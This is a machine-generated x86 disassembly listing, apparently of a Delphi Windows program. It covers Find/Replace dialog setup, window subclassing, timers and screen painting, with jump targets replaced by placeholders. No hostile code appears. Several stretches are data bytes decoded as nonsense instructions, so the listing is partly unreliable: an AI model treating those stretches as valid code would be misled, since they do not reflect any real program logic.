add [ edx + eax * 2 + 0x44 ] bh
add [ esi + esi * 2 + 0x44 ] dh
add [ eax ] ch
popad
inc esp
add [ eax + 0x64 ] dl
inc esp
add [ ecx ] al
add [ ecx ] ah
mov al 0xa4
rol [ edx ] cl
adc [ edx + edx * 2 + 0x65 ] edx
imul esi [ fs : edx + 0x65 ] 0x726f7463
push edi
imul ebp [ esi + 0x64 ] 0xc08b776f
sbb al 0xd2
inc edx
add [ edi ] al
adc [ edx + edx * 2 + 0x65 ] edx
imul esi [ fs : edx + 0x65 ] 0x726f7463
push edi
imul ebp [ esi + 0x64 ] 0xd134776f
inc edx
add al ah
retn 0x43
sub_42d237
or eax [ eax ]
pop es
inc esp
imul esp [ ecx + 0x6c ] 0x73676f
add [ eax - 0xd74a9ad ] dl
mov ebx eax
mov edx esi
mov eax ebx
call sub_443324
mov [ esi + 0x4 ] 0x90000000
mov eax [ ebx + 0x20c ]
mov [ esi + 0x1c ] eax
pop esi
pop ebx
retn
sub_42d268
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_443eac
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0xb021
je r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov edx ebx
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
and eax 0x7f
mov [ ebx + 0xc ] eax
sub_42d2ac
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call GetPropA
push eax
call CallWindowProcA
pop ebp
retn
sub_42d2e8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
sub eax 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460ba4
cmp eax [ ebp + 0x8 ]
jne r-xdata
sub eax 0x80
je r-xdata
push ebp
call sub_42d2ac
pop ecx
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_460bc8
jmp r-xdata
push ebp
call sub_42d2ac
pop ecx
mov ebx eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call RemovePropA
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460ba4
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460ba4
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_460bc8
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
call sub_460bc8
jmp r-xdata
sub_42d39c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push edi
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
call sub_42c340
cmp esi 0x110
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov esi [ edi + 0x1c ]
mov eax esi
call sub_42d65c
inc eax
jne r-xdata
push 0x15
push 0x0
push 0x0
mov eax esi
call sub_42d6c4
push eax
mov eax esi
call sub_42d65c
push eax
push 0x0
push ebx
call SetWindowPos
mov eax esi
call sub_42d6c4
inc eax
je r-xdata
push 0xfffffffc
push ebx
call GetWindowLongA
push eax
movzx eax [ rw-data ]
push eax
push ebx
call SetPropA
push sub_42d2e8
push 0xfffffffc
push ebx
call SetWindowLongA
mov eax 0x1
sub_42d424
push ebp
mov ebp esp
push ecx
push ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42c3a8
mov ax [ r-xdata ]
mov [ ebx + 0x58 ] ax
mov [ ebx + 0x5a ] 0xffffffff
mov [ ebx + 0x5e ] 0xffffffff
lea eax [ ebx + 0x84 ]
mov [ eax ] 0x28
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x30 ]
mov [ eax + 0x4 ] edx
mov edx [ rw-data ]
mov [ eax + 0x8 ] edx
lea edx [ ebx + 0xac ]
mov [ eax + 0x10 ] edx
mov [ eax + 0x18 ] 0x100
lea edx [ ebx + 0x1ac ]
mov [ eax + 0x14 ] edx
mov [ eax + 0x1a ] 0x100
mov [ eax + 0x1c ] ebx
mov [ eax + 0x20 ] sub_42d39c
mov eax FindTextA
mov [ ebx + 0x64 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42d4ce
add [ eax ] al
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x10
push eax
call SendMessageA
lea eax [ esi + 0x68 ]
call sub_40d18c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42c3f0
test bl bl
jle r-xdata
xor edx edx
mov [ eax + 0x208 ] edx
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_42d524
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_43cb90
mov ebx eax
or edi 0xffffffff
test ebx ebx
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
xor edi edi
sub_42d560
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
test eax eax
je r-xdata
mov [ ebx + 0x90 ] 0x100
mov [ ebx + 0xa4 ] sub_42d39c
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4421c4
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0x208 ] ebx
lea eax [ esi + 0x20c ]
push eax
push sub_42d524
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ ebx + 0x68 ]
call sub_4464d0
mov [ ebx + 0x88 ] eax
xor eax eax
mov esi rw-data
push eax
call BringWindowToTop
mov al 0x1
pop esi
pop ebx
retn
jae r-xdata
and edx 0x7f
bt [ ebx + 0x58 ] edx
inc eax
add esi 0x4
cmp al 0xd
jne r-xdata
mov edx [ esi ]
or [ ebx + 0x90 ] edx
mov edx eax
cmp dl 0xf
ja r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov [ rw-data ] ebx
lea eax [ ebx + 0x84 ]
push eax
call [ ebx + 0x64 ]
mov esi eax
mov [ ebx + 0x80 ] esi
test esi esi
setne al
pop esi
pop ebx
retn
or [ ebx + 0x90 ] 0x200
mov eax [ ebx + 0x44 ]
mov [ ebx + 0xa8 ] eax
sub_42d674
push ebx
add esp 0xfffffff0
mov ebx edx
mov edx [ eax + 0x5a ]
mov [ ebx ] edx
mov edx [ eax + 0x5e ]
mov [ ebx + 0x4 ] edx
mov edx [ eax + 0x80 ]
test edx edx
je r-xdata
add esp 0x10
pop ebx
retn
push esp
push edx
call GetWindowRect
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
sub_42d6dc
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_42c424
test al al
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov edx [ ebx ]
cmp edx [ rw-data ]
jne r-xdata
mov edx [ ebx + 0x8 ]
lea ecx [ edi + 0x84 ]
cmp edx ecx
jne r-xdata
mov ax [ r-xdata ]
mov [ edi + 0x58 ] ax
xor ebx ebx
mov esi rw-data
inc ebx
add esi 0x4
cmp bl 0xd
jne r-xdata
mov eax ebx
cmp al 0xf
ja r-xdata
mov eax [ edi + 0x90 ]
and eax [ esi ]
je r-xdata
mov eax [ edi + 0x90 ]
test al 0x8
je r-xdata
and eax 0x7f
bts [ edi + 0x58 ] eax
test al 0x30
je r-xdata
mov eax edi
mov si 0xffed
call sub_4034e4
jmp r-xdata
test al 0x40
je r-xdata
mov eax edi
mov si 0xffec
call sub_4034e4
jmp r-xdata
mov al 0x1
push esp
mov eax [ edi + 0x80 ]
push eax
call GetWindowRect
mov eax [ esp ]
mov [ edi + 0x5a ] eax
mov eax [ esp + 0x4 ]
mov [ edi + 0x5e ] eax
xor eax eax
mov [ edi + 0x80 ] eax
push 0x0
push 0x0
push 0xb021
mov eax [ edi + 0x68 ]
call sub_4464d0
push eax
call PostMessageA
xor eax eax
mov [ edi + 0x68 ] eax
sub_42d7d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4044f8
mov edx eax
lea eax [ ebx + 0xac ]
mov ecx 0xff
call sub_4088b4
pop esi
pop ebx
retn
sub_42d7f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4044f8
mov edx eax
lea eax [ ebx + 0x1ac ]
mov ecx 0xff
call sub_4088b4
pop esi
pop ebx
retn
sub_42d81c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42d424
mov eax ReplaceTextA
mov [ esi + 0x64 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42d900
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408e98
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_42d99b
add [ edi ] cl
add [ eax ] al
add [ eax + 0x8 ] al
inc edi
add [ ecx + edi * 2 + 0x47 ] al
add [ eax ] al
cmp al 0x8
inc edi
add ah ch
jpo r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] bh
or [ edi ] al
pop esp
jns r-xdata
push sub_42daa6
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
add [ eax ] al
add [ eax ] al
add [ eax ] bl
or [ edi ] al
xchg esp eax
jge r-xdata
add [ eax ] al
add [ eax + ecx ] bl
inc edi
add [ eax ] cl
jpo r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx ] dh
inc edi
add [ eax ] cl
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
cmp [ rw-data ] 0x0
jne r-xdata
add eax rw-data
add [ eax ] al
add [ eax ] al
add ah ah
pop es
inc edi
add ah dl
jns r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] dh
or [ edi ] al
or [ edi + eax * 2 ] bh
add [ eax ] al
add [ eax ] al
sub al 0x8
inc edi
add [ eax + 0x477b ] ah
add [ eax ] al
add [ eax ] ch
or [ edi ] al
xchg esp eax
jl r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_404ac0
mov ax [ rw-data ]
push eax
je r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
pop es
inc edi
add al ch
jl r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ecx ] ah
inc edi
add ah ah
jpe r-xdata
call GlobalDeleteAtom
add [ eax ] al
add [ eax ] al
add ah bl
pop es
inc edi
add [ eax ] dh
jge r-xdata
mov [ fs : eax ] edx
push sub_42daad
retn
add [ eax ] al
add [ ebx + 0x4010e415 ] cl
add al ch
sub [ eax - 0x3 ] dh
push [ ebx ]
rcr [ edx + 0x59 ] 0x59
add [ eax ] al
add [ eax ] al
add al bl
pop es
inc edi
add [ eax + 0x7b ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] ah
or [ edi ] al
mov eax 0x477b
sub_42dab0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403e0c
call sub_42d900
mov eax [ r-xdata ]
call sub_416dac
mov eax [ r-xdata ]
call sub_416e4c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_416df8
sub_42daf0
cmp al 0xdb
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
fild [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_42e366
inc edx
add [ eax ] ah
inc esp
add [ eax + 0x34 ] dl
inc esp
add al dl
cmp [ eax + eax - 0x2c ] eax
cmp [ eax + eax - 0x74 ] eax
cmp [ eax + eax + 0x34 ] al
cmp [ eax + eax - 0x1c ] al
inc esp
add [ ecx + eax * 4 - 0xa1bffbc ] bl
inc edx
add [ eax ] ch
popad
inc esp
add [ eax + 0x64 ] dl
inc esp
add [ eax ] dl
inc edx
add [ esi ] al
push esp
push eax
popad
outsb
insb
nop
movsb [ edi ] [ esi ]
jecxz r-xdata
and [ edx ] al
add bh bh
add [ edi ] al
push es
push esp
push eax
popad
outsb
insb
int3
sub_42eb0e
clc
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08003e ] al
outsb
push edx
jae r-xdata
dec edi
jpe r-xdata
add [ eax ] cl
sbb [ ebp + 0x1000043 ] dh
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
clc
jb r-xdata
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_420958
inc esp
outsd
arpl [ ebx + 0x10 ] bp
mov bl 0x43
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
outsb
push ebx
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
jb r-xdata
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_421114
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_420958
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_421114
pop ebx
mov esp ebp
pop ebp
retn
inc ebp
in al 0x8b
inc ebp
clc
inc esp
jb r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
fmul [ ebx + 0x4589f445 ]
fmul [ ebx - 0x1fba76fd ]
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x55 ] bp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lodsb [ si ]
mov ah 0x43
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080041 ] al
sub_42eb98
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_420958
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_421114
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_420958
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_421114
pop ebx
mov esp ebp
pop ebp
retn
sub_42ec5c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_420a64
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_42eb98
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_42ecbc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4476b4
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x69
mov eax esi
call sub_43f46c
mov edx 0x69
mov eax esi
call sub_43f490
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42ed1c
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_42138c
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_420c38
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x16a ] 0x0
je r-xdata
mov esi [ ebx + 0x160 ]
mov dl 0x1
mov eax [ esi + 0x10 ]
call sub_420a34
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_420d54
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax esi
call sub_42114c
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x16c ]
call [ ebx + 0x168 ]
sub_42ed90
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41d098
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_42ee18
call sub_41e1e4
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42ede0
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_42ee8c
mov eax [ esi + 0x34 ]
call sub_41e298
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d0e4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_42ee18
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_42ee52
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4034e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42ee8c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_42ef0b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ef12
lea eax [ ebp - 0x4 ]
call sub_404038
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
sub_42ef64
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4480f0
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_433194
call sub_433274
test al al
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov edx 0xb9
mov eax esi
call sub_43f46c
mov edx 0x29
mov eax esi
call sub_43f490
mov [ esi + 0x220 ] 0x2
mov dl 0x2
mov eax esi
call sub_42f3b4
mov edx 0x1
mov eax esi
call sub_42f3d0
mov [ esi + 0x21c ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_43fe50
mov [ esi + 0x21d ] 0x1
mov dl 0x1
mov eax esi
call sub_446764
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42f028
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443324
xor eax eax
mov al [ ebx + 0x21c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_42f098
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_445ab0
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
mov eax ebx
call sub_443a38
sub_42f0d8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42f1c8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_43fcb0
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_444974
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f1cf
lea eax [ ebp - 0x14 ]
call sub_404038
retn
mov esi [ ebx + 0x218 ]
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
add esi [ ebx + 0x214 ]
test esi esi
jle r-xdata
add esi [ ebx + 0x214 ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_4464d0
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_4464d0
push eax
call InvalidateRect
sub_42f1d8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_42f210
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42f372
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov al [ ebx + 0x212 ]
test al al
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x208 ]
call sub_42ec5c
mov al [ ebx + 0x211 ]
test al al
je r-xdata
push ebp
call sub_42f1d8
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_42ec5c
mov esi [ ebx + 0x208 ]
call sub_433194
call sub_433274
test al al
je r-xdata
push ebp
call sub_42f1d8
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_42ec5c
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_420c38
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_421010
mov eax ebx
call sub_44766c
test al al
jne r-xdata
mov [ ebp - 0x14 ] edx
add eax edx
mov [ ebp - 0xc ] eax
xor eax eax
mov al [ ebx + 0x220 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x44
mov edx edi
mov eax ebx
call sub_441f90
mov edi eax
push edi
